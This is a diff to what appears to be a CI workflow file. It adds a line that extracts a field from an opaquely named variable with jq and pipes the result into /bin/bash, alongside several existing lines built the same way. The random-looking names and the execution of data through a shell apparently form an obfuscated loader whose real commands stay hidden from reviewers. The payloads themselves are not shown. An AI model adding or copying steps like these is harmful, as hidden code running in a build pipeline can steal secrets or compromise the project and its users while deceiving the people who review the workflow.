@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$lino38" | jq -r .gdbe917 | /bin/bash
           echo $x2 | jq -r .wfrb4 | /bin/bash
           printf '%s' "$ueii757" | jq -r .nx2 | /bin/bash
+          echo $x56 | jq -r .s3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
